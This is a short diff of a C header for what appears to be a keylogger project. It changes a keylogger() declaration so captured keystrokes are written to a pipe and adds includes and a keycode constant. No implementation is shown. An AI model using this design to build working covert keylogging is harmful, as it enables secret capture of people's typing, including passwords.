@@ -6,17 +6,19 @@
 #include <stdlib.h>
 #include <unistd.h>
 #include <signal.h>
+#include <string.h>
+#include <syslog.h>
 
 #define NUM_EVENTS 128
+#define NUM_KEYCODES 71
 
 /**
- * Captures keystrokes by reading from the keyboard resource and writing to
- * the writeout file. Continues reading until SIGINT is received. A newline is
- * appended to the end of the file.
+ * Captures keystrokes by reading from the keyboard resource and writes them to
+ * a pipe. Continues reading until SIGINT or SIGPIPE is received.
  *
  * @param keyboard The file descriptor for the keyboard input file
- * @param writeout The file descriptor to write keystrokes out to
+ * @param write_pipe The file descriptor of the write end of the pipe
  */
-void keylogger(int keyboard, int writeout);
+void keylogger(int keyboard, int write_pipe);
 
 #endif //DEMON_KEYLOGGER_KEYLOGGER_H
